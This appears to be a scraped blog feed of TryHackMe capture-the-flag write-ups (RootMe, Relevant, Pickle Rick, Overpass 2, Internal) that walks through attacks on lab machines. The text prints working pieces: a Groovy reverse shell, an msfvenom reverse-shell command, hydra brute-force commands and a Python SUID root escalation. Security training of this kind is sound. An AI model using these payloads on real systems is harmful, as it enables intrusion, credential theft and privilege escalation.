HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 10.91 secondsI then navigated to the website to manually crawl it while gobuster ran in the background.gobuster indicated a hidden /panel directory which contains an file upload.$ gobuster dir -u http://10.10.55.244/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.55.244/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2021/04/13 11:57:47 Starting gobuster in directory enumeration mode===============================================================/uploads (Status: 301) [Size: 314] [--&gt; http://10.10.55.244/uploads/]/css (Status: 301) [Size: 310] [--&gt; http://10.10.55.244/css/] /js (Status: 301) [Size: 309] [--&gt; http://10.10.55.244/js/] /panel (Status: 301) [Size: 312] [--&gt; http://10.10.55.244/panel/]Getting a ShellI attempted to upload a PHP reverse shell that I downloaded from !(here)[http://pentestmonkey.net/tools/web-shells/php-reverse-shell]. I then changed the $ip variable to the IP address of my machine and the $port variable to 4444. However, it appears that the website does not allow .php files from being uploaded.After some head scratching and playing around with various file extensions, I realised that there are two PHP file extensions: .php and .php5. I changed the shell’s extension to the latter and the upload was successful:I then started a netcat session which listens on port 4444, and navigated to the reverse shell I just uploaded using the /uploads directory, giving me access to the machine.$ nc -nvlp 4444 listening on [any] 4444 ...connect to [10.9.150.161] from (UNKNOWN) [10.10.55.244] 44316Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 11:09:40 up 14 min, 0 users, load average: 0.00, 0.37, 0.61USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ python -c 'import pty; pty.spawn(\"/bin/bash\")'bash-4.4$ I used the find command in order to find the user.txt file:bash-4.4$ find / type f -name user.txt 2&gt; /dev/null/var/www/user.txt -type f: looking exclusively for files. -name user.txt: looking for a file with the name “user.txt”. 2&gt; /dev/null: error messages are not shown when the command executes.Looking at the contents of user.txt gives the first flag:bash-4.4$ cat /var/www/user.txtTHM{y*************l}Privilege EscalationThe instructions state that there is an odd file when searching for SUID permissions.bash-4.4$ find / -user root -perm /4000 2&gt;/dev/nullfind / -user root -perm /4000 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/bin/traceroute6.iputils/usr/bin/newuidmap/usr/bin/newgidmap/usr/bin/chsh/usr/bin/python/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/bin/newgrp/usr/bin/passwd/usr/bin/pkexec/snap/core/8268/bin/mount/snap/core/8268/bin/ping/snap/core/8268/bin/ping6/snap/core/8268/bin/su/snap/core/8268/bin/umount/snap/core/8268/usr/bin/chfn/snap/core/8268/usr/bin/chsh/snap/core/8268/usr/bin/gpasswd/snap/core/8268/usr/bin/newgrp/snap/core/8268/usr/bin/passwd/snap/core/8268/usr/bin/sudo/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/8268/usr/lib/openssh/ssh-keysign/snap/core/8268/usr/lib/snapd/snap-confine/snap/core/8268/usr/sbin/pppd/snap/core/9665/bin/mount/snap/core/9665/bin/ping/snap/core/9665/bin/ping6/snap/core/9665/bin/su/snap/core/9665/bin/umount/snap/core/9665/usr/bin/chfn/snap/core/9665/usr/bin/chsh/snap/core/9665/usr/bin/gpasswd/snap/core/9665/usr/bin/newgrp/snap/core/9665/usr/bin/passwd/snap/core/9665/usr/bin/sudo/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/9665/usr/lib/openssh/ssh-keysign/snap/core/9665/usr/lib/snapd/snap-confine/snap/core/9665/usr/sbin/pppd/bin/mount/bin/su/bin/fusermount/bin/ping/bin/umountUsing the command from the hint, I found that Python has been granted SUID permissions, so I used that to escalate my privileges. This can be done numerous ways. In this case, I used the following command:$ python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'whoamirootcat /root/root.txtTHM{p******************n}And that’s it!Summary and FeedbackOverall, this is a very easy room. If you are a beginner and want to learn a bit of privilege escalation, this is ideal for you!" }, { "title": "Relevant Writeup | TryHackMe", "url": "/posts/relevant-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, security, misconfiguration, accessible, pentest", "date": "2022-01-25 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Relevant room on TryHackMe. This as incredibly well-designed room which really tests your enumeration abilities. It is an unfortunate reality that the most obvious finding is not always exploitable. This is why this room was created - to allow you to take a step back, look at your findings, and adapt your approach accordingly.This room is not guided, so may not be ideal for beginners. I would recommend attempting other rooms like HackPark and Skynet to get a feel for what is required to tackle this room.How to AccessI completed this on TryHackMe as part of the Offensive Pentesting learning path. You can access it here.StepsRules of EngagementThe instructions for this room define the following rules of engagement: Any tools or techniques are permitted, however we ask that you attempt manual exploitation first Locate and note all vulnerabilities found Submit the flags discovered to the dashboard (user.txt and root.txt) Only the IP addres assigned to your machine is in scope Find and report ALL vulnerabilities (yes, there is more than one path to root)With that all noted down, let’s begin!ScanningAs usual, let’s start with an nmap scan of the target system:$ nmap -sC -sV -oN scans/nmap_initial -p- 10.10.183.73# Nmap 7.91 scan initiated Thu May 27 12:29:11 2021 as: nmap -sC -sV -oN scans/nmap_initial -p- 10.10.183.73Nmap scan report for 10.10.183.73Host is up (0.038s latency).Not shown: 65527 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: RELEVANT| NetBIOS_Domain_Name: RELEVANT| NetBIOS_Computer_Name: RELEVANT| DNS_Domain_Name: Relevant| DNS_Computer_Name: Relevant| Product_Version: 10.0.14393|_ System_Time: 2021-05-27T11:32:31+00:00| ssl-cert: Subject: commonName=Relevant| Not valid before: 2021-05-26T10:49:52|_Not valid after: 2021-11-25T10:49:52|_ssl-date: 2021-05-27T11:33:11+00:00; -2s from scanner time.49663/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server49667/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 1h23m58s, deviation: 3h07m51s, median: -2s| smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)| Computer name: Relevant| NetBIOS computer name: RELEVANT\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2021-05-27T04:32:34-07:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-05-27T11:32:35|_ start_date: 2021-05-27T10:50:09Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu May 27 12:33:13 2021 -- 1 IP address (1 host up) scanned in 241.92 secondsAs the output shows, there are 7 ports open on the target machine: HTTP on port 80 (Microsoft IIS httpd v2.0) MSRPC on port 135 Netbios-ssn on port 139 Microsoft-ds on port 445 (SMB) MS-WBT-Serber on port 3389 HTTP on port 49663 (Microsoft IIS httpd v10.0) MSRPC on ports 49667 and 49669The machine is also running Windows Server 2016.EnuemrationLet’s first enumerate Samba service on port 445 using smbclient:So we have four shares: ADMIN$ C$ IPC$ nt4wrksvIt turns out that the nt4wrksv share can be accessed anonymously:As shown above, there is a passwords.txt file stored on the share. We can use the get command to retrieve the file. Let’s look at the contents of the file:[User Passwords - Encoded]Qm9iIC0gIVB*****************QmlsbCAtIEp1dzRubmFNNG4*****************In this file, there are two base64 strings. Decoding these reveals the passwords for two users bob and bill:Unfortunately, there isn’t anything we can do with these passwords. So let’s reassess what we found with our initial nmap scan.We see that there are two web servers on ports 80 and 49663, respectively. Both of these display the default IIS (Internet Information Services) web pages:Now, let’s fire up gobuster to enumerate the directories on each port:As you can see, nothing showed up on the first scan. However, the second scan showed a hit for the /nt4wrksv directory. Recall that this is the name of the SMB share which we were able to access anonymously.To confirm this, we can navigate to /nt4wrks/passwords.txt:This means that we can upload files to the SMB share and access them through our browser. So let’s try and upload a reverse shell.ExploitationSince this is an ISS machine, they require .aspx shells. I used this one here but you can also create one with msfvenom using the following command:msfvenom -p windows/x86/shell_reverse_tcp LHOST&lt;your_ip&gt; LPORT=&lt;your_listening_port&gt; -f aspx -o shell.aspxLet’s now upload this through SMB:We also need to start a netcat listener on the port we declared when creating the payload. Now, navigate to /nt4wkrs/shell.aspx in your browser. netcat should catch the callback:We can now retrieve the user.txt flag from the C:\\Users\\Bob\\Desktop directory:Privilege EscalationNow that we have shell access, let’s check out what privileges we have:SeImpersonatePrivilege immediately stands out to me as something that we can use to escalate our privileges. While conducting a bit of research into this, I stumbled across the following GitHub repository:https://github.com/dievus/printspooferThis allows you to escalate service user privileges on Windows Server 2016, Server 2019, and Windows 10 machines using the SeImpersonate privilege.Firstly, clone this repository to your system using git clone. Then, using the SMB share, upload the exploit to the target machine:These share files are stored in the C:\\inetpub\\wwwroot\\nt4wrksv directory. Let’s navigate to that on our current shell and execute the exploit:We can then retrieve the root.txt flag in the C:\\Users\\Administrator\\Desktop directory:And that’s it! All done!Summary and FeedbackIn this room we: Scanned ports using nmap Used gobuster to enumerate directories Used smbclient to enumerate Samba (SMB) shares Decoded passwords using base64 Exploited SMB shares to gain a reverse shell Escalated our privileges by exploiting the SeImpersonate privilegeThis room was a real test of my enumeration abilities. When faced with failure, it forced me to reassess what I had discovered and adapt my approach.I hope you enjoyed this writeup and learned a thing or two from this room." }, { "title": "Pickle Rick Writeup | TryHackMe", "url": "/posts/pickle-rick-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, ctf, dirbuster, linux", "date": "2022-01-24 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Pickle Rick CTF. This is a free room of easy difficulty which tests your knowledge of enumeration and linux commands.How to AccessI completed this room on TryHackMe. The link to the room is shown below: https://tryhackme.com/room/picklerickStepsReconnaissanceAs usual, the first thing you should do is enumerate. I began with a simple nmap scan:$ nmap -sC -sV -oN nmap/initial 10.10.6.223 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 18:37 BST Nmap scan report for 10.10.6.223Host is up (0.17s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 80:db:87:31:0d:17:d5:01:0f:03:d1:ab:45:10:5d:c3 (RSA)| 256 e0:65:b7:a4:60:68:f5:fe:c3:6a:47:52:52:7b:e3:f1 (ECDSA)|_ 256 f1:e7:08:30:5f:ff:e7:9c:da:73:f4:a7:b3:c9:65:6b (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Rick is sup4r coolService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.10 secondsIt shows an open SSH port (22) and Apache web server (port 80). I navigated to the website while running gobuster and nikto in the background to further enumerate the machine.The source code of the website also reveals in interesting comment:&lt;!--Note to self, remember username!Username: R1ckRul3s--&gt;I also looked at robots.txt which simply contained: Wubbalubbadubdub.The output of gobuster shows an /assets folder containing various media files.===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.6.223/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2021/04/12 18:43:58 Starting gobuster in directory enumeration mode===============================================================/assets (Status: 301) [Size: 311] [--&gt; http://10.10.6.223/assets/]===============================================================2021/04/12 18:51:45 Finished===============================================================The nikto scan revealed a login.php page.- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 10.10.6.223+ Target Hostname: 10.10.6.223+ Target Port: 80+ Start Time: 2021-04-12 18:47:26 (GMT1)---------------------------------------------------------------------------+ Server: Apache/2.4.18 (Ubuntu)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip+ Cookie PHPSESSID created without the httponly flag+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST + OSVDB-3233: /icons/README: Apache default file found.+ /login.php: Admin login page/section found.+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host+ End Time: 2021-04-12 18:54:09 (GMT1) (403 seconds)---------------------------------------------------------------------------+ 1 host(s) testedNow that I have completed enumeration, I attempted to login via the login.php page using the username I found earlier. The login panel is shown below:Gaining AccessI realised that the jibberish from the robots.txt file may be the password for the R1ckRul3s user. Using this username/password combination, I was able to login:All other pages except “Commands” are restricted to the R1ckRul3s user.Finding the First FlagI tried a few basic Linux commands to verify that the commands were working:This command panel appears to connect me as the www-data user. I then proceeded to list the contents of the current directory (using ls -la):Unfortunately, the cat command is filtered out along with head and tail. So, navigating to the Sup3rS3cretPick13Ingred.txt file it gives us the first ingredient (flag 1):Also, inspecting the contents of clue.txt reveals the following:Look around the file system for the other ingredient.Finding the Second FlagAs this is a UNIX file system, it will contain the following common directories: /root: the home directory of the root user. /etc: configuration files. /home: home folders for each user. /lib: essential shared libraries. /lost+found: recovered files. /media: removable media. /mnt: temporary mount points. /opt: optional packages install directory. /run: application state files. /sbin: system administrator binaries. …Viewing the contents of the /home directory reveals a rick directory. Within this directory, there is a second ingredients file.Fortunately, you can use the less command to view its contents:This gives us the second ingredient (flag 2).Finding the Third and Final FlagI suspected that the final flag would be in the /root directory. Currently, I am unable to access it as the www-data user so we must find a way around this. Using sudo -l I was able to view what I can run as the www-data user:As shown, you can execute any command on this box without a password: (ALL NOPASSWD:ALL). All I need to do is prepend sudo to the start of the command and I can execute it.Viewing the contents of the /root directory:It shows a 3rd.txt which contains the final ingredient (final flag):And that’s it!Summary and FeedbackAs mentioned, this room is designed for beginners. It is a very enjoyable challenge and it really tests your ability to navigate through a UNIX/Linux system as well as your information gathering techniques - two fundamental skills for penetration testing." }, { "title": "Overpass 2 - Hacked Writeup | TryHackMe", "url": "/posts/overpass-2-hacked-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, security, forensics, wireshark, linux", "date": "2022-01-23 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Overpass 2 room on TryHackMe. This is quite a varied room which involves using Wireshark to analyse a .pcap capture file. You must then use the information you find to access the system and escalate your priveleges.How to AccessI completed this room on TryHackMe. You can access it here.StepsTask 1 - Forensics - Analyse the PCAPThis part contains a downlaodable .pcap file. Let’s open Wireshark and see what’s going on. Firstly, a HTTP GET request is being made to the /development directory:This is where the following payload is being uploaded:The attacker then runs sudo -l as the james user using the given password:After they dump the /etc/shadow file, they establish persistence using the https://github.com/NinjaJc01/ssh-backdoor:Using JohnTheRipper and the fasttrack wordlist (found here), you can crack the hashes in the dumped /etc/shadow file:$ john shadow --wordlist fasttrack.txtUsing defualt input encoding: UTF-8Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])Remaining 1 password hashCost 1 (iteration count) is 5000 for all loaded hashesWill run 12 OpenMP threadsPress 'q' or Ctrl-C to abord, almost any other key for status0g 00:00:00:00 DONE (2021-05-26 20:21) 0g/s 3000p/s 3000c/s 3000C/s P@55w0rd..starwarsSession compelted.$ john shadow --showparadox:*********:18646:0:99999:7:::szymex:*******:18464:0:99999:7:::bee:********:18464:0:99999:7:::muirland:********:18464:0:99999:7:::4 password hashes cracked, 1 leftAs you can see, it was able to crack 4 out of the 5 passwords.Task 2 - Research - Analyse the CodeAnalysing the backdoor code (found here), the default hash for the backdoor is:And the hardcorded salt for the backdoor is:Now, back to the .pcap file, the hash which the attacker used is as follows:In order to crack this hash with hashcat, you first have to find the type of the hash. As we know, the hash is SHA512 and contains a hashed password followed by a salt. Using that information, we are able to determine the type:Now, we’re able to crack the hash:Task 3 - Attack - Get Back In!Now we can use this information to get back into the site. Running an nmap scan, we can see that there is another SSH service running on port 2222:$ nmap -sC -sV -oN scans/initial 10.10.247.107Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 20:44 BSTNmap scan report for 10.10.247.107Host is up (0.065s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)| 256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)|_ 256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: LOL Hacked2222/tcp open ssh OpenSSH 8.2p1 Debian 4 (protocol 2.0)| ssh-hostkey: |_ 2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 38.57 secondsThere is also a defaced website running on port 80, showing the text H4ck3d by CooctusClan:As we know from the .pcap analysis, the attackers were logged in as the james user with the password which we cracked earlier. We can use these credentials to log in through this SSH port:From here, we’re able to grab the user.txt flag:There is also a .suid_bash file in the /home/james directory:Running this using -p meaning that we maintain permissions, allows us to escalate our privileges to the root user and subsequently grab the root.txt flag:Summary and FeedbackIn this room we: Used Wireshark to analyse a .pcap file Used JohnTheRipper to crack hashes from a dumped /etc/shadow file Used hashcat to crack a hash with a known salt Replicated the attacker’s actions to break into the system Escalated our privileges using a file which the hackers behindThis was a very quick and easy room to compelte and effectively combines key aspects of both forensics and penetration testing.I hope you enjoyed this writeup." }, { "title": "Internal Writeup | TryHackMe", "url": "/posts/internal-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, security, accessible, pentest, misconfiguration", "date": "2022-01-22 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Internal room on TryHackMe. Similar to the Relevant room, this room is not guided, so enumeration is key. In order to gain root, you must know how to exploit Wordpress and manually enumerate the system once you have gained access. You then have to exploit an internally hosted Jenkins server leading to a Docker container.This is a hard room, so if you’re a beginner, I would highly recommend trying some other rooms like Alfred and Mr. Robot so that you become familiar with the technologies and techniques required to retrieve the flags.How to AccessI completed this challenge on TryHackme. You can access it here.StepsRules of EngagementThe instructions for this room define the following rules of engagement: Ensure that you modify your hosts file to reflect internal.thm Any tools or techniques are permitted in this engagement Locare and note all vulnerabilities found Submit the flags discovered to the dashboard (user.txt, root.txt) Only the IP address assigned to your machine is in scopeWith that all noted down, let’s begin!Modifying /etc/hostsAs the first RoE states, we have to include interal.thm in our /etc/hosts file. To do this, in a terminal, type:$ sudo nano /etc/hostsThen, copy and paste the IP address of the target machine type internal.thm. Your file should look something like this:127.0.0.1 localhost127.0.1.1 kali&lt;ip_addr&gt; internal.thm# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff01::1 ip6-allnodesff02::2 ip6-allroutersScanningLet’s begin with an nmap scan:$ nmap -sC -sV -oN scans/nmap_initial 10.10.167.33# Nmap 7.91 scan initiated Thu May 27 16:57:47 2021 as: nmap -sC -sV -oN scans/nmap_initial 10.10.167.33Nmap scan report for 10.10.167.33Host is up (0.053s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)| 256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)|_ 256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu May 27 16:57:56 2021 -- 1 IP address (1 host up) scanned in 9.26 secondsAs the output shows, there are 2 open ports on the target machine: SSH on port 22 (Ubuntu v7.6p1) HTTP on port 80 (Apache v2.4.29)EnumerationLet’s begin with the web server on port 80. If you navigate to the website, it will show the default Apache web page. Let’s run gobuster to see if there is anything else running:$ gobuster dir -u http://10.10.167.33/ -w /usr/share/wordlists/dirb/common.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.167.33/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2021/05/27 16:59:43 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 277]/.htpasswd (Status: 403) [Size: 277]/.htaccess (Status: 403) [Size: 277]/blog (Status: 301) [Size: 311] [--&gt; http://10.10.167.33/blog/]/index.html (Status: 200) [Size: 10918] /javascript (Status: 301) [Size: 317] [--&gt; http://10.10.167.33/javascript/]/phpmyadmin (Status: 301) [Size: 317] [--&gt; http://10.10.167.33/phpmyadmin/]/server-status (Status: 403) [Size: 277] /wordpress (Status: 301) [Size: 316] [--&gt; http://10.10.167.33/wordpress/] ===============================================================2021/05/27 17:00:08 Finished===============================================================So there is a /blog directory which looks like this:There is also two login pages. One to phpmyadmin and one to wordpress:Now that we know Wordpress is running in the background, we can run wpscan to enumerate this part of the site:$ wpscan --url http://10.10.167.33/blog --enumerate u_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://10.10.167.33/blog/ [10.10.167.33][+] Started: Thu May 27 17:09:29 2021Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://10.10.167.33/blog/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://10.10.167.33/blog/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://10.10.167.33/blog/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Emoji Settings (Passive Detection) | - http://10.10.167.33/blog/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2' | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.167.33/blog/, Match: 'WordPress 5.4.2'[i] The main theme could not be detected.[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 &lt;====================================&gt; (10 / 10) 100.00% Time: 00:00:00[i] User(s) Identified:[+] admin | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Thu May 27 17:09:32 2021[+] Requests Done: 48[+] Cached Requests: 5[+] Data Sent: 11.942 KB[+] Data Received: 302.953 KB[+] Memory used: 128.887 MB[+] Elapsed time: 00:00:02From the output, we can see that the scan has identified an admin user as well as the version of Wordpress being used - 5.4.2. Trying some classic credential combinations confirms that admin is a valid user:Let’s boot up Burpsuite and see what’s being sent when the login form is submitted:We can now use this with hydra to brute force the password for the admin user.ExploitationUsing the following hydra command, you are able to get the password for the admin user:$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.167.33 -V http-form-post '/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;testcookie=1:S=location'Here, we are using the -l to specify the username (admin), -P to specify the wordlist (rockyou.txt), and -V to use verbose mode. We also use specify the type of the form using http-form-post and the paramters from Burpsuite.Now, use these credentials to log in to the site.Looking at the published pages, you will see that there is one private page:This page holds credentials for william:Unfortunately, this does not lead anywhere as there is no william user on the Wordpress site.However, we can use the Wordpress Theme Editor to get a reverse shell. I am using the PHP reverse shell from pentest monkey (find it here).Then, choose a page to edit (I’m using 404.php), and paste in the reverse shell. Make sure to change the IP address and port so that you can catch the callback with netcat:Then, configure netcat to listen on the port you chose. Then, navigate to /blog/wp-content/themes/twentyseventeen/404.php and your netcat listener should catch the callback:A quick look around the system reveals that there is a aubreanna user in the /home directory:But we cannot access it, so we need to do some more enumeration. However, this room has been set up in such a way to promote manual enumeration, so linPEAS will not work.Looking through /var/www/html, you will find the wp-config.php file containing credentials to the phpmyadmin page we found earlier:Eventually, you’ll come across the /opt directory which contains the wp-save.txt file.Bill,Aubreanna needed these credentials for something later. Let her know you have them and where they are.aubreanna:***************We can now use these credentials to login as aubreanna via SSH:Now, we can grab the user.txt flag within /home/aubreanna:All we have left to do now is escalate our privileges to grab the root.txt flag.Privilege EscalationWithin the /home/aubreanna directory, there is also a jenkins.txt file:Looks like there is an internal server running on 172.17.0.2:8080. We can use SSH tunnelling to allow open this server up:Here we are creating a tunnel from port 4444 on our machine to port 8080 on the target machine. This means that we can navigate to localhost:4444 and access this internal server:Similar to what we did earlier with Wordpress, we can view the Network tab of our browser’s developer tools to see what is being sent when the login form is submitted:We can then use hydra again to bruteforce the password for the admin user:$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 4444 -V -f http-form-post '/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password'Here we are using -l to specify the username (admin), -P to specify the wordlist (rockyou.txt), the IP and port to use (127.0.0.1 (localhost) and 4444), -V for verbose, and -f to tell hydra to exit once a valid combination is found. We also specify that this uses the POST method (http-post-form) and pass in the parameters we found from the network tab.Eventually, we manage to get the credentials for the admin user:Once we log in, we see that version 2.250 of Jenkins is being used. I found an article online (here) which says you can use the “Script console” to execute groovy scripts on the system. We exploit this to gain a reverse shell back to our machine:String host=\"&lt;ip_address&gt;\";int port=8888;String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();Make sure to run netcat on your chosen port so that it can catch the callback:We are now logged in as the jenkins user, but we need to be root. So, we need to do more enumeration. We found credentials in the /opt directory last time, so let’s start there. It turns out that there is a note.txt file within this folder containing credentials for the root user:Now, we can use su to switch user over to root and retrieve the root.txt flag:And that’s it! All done!Summary and FeedbackIn this room we: Scanned ports using nmap Enumerated Wordpress with wpscan Used gobuster to enumerate 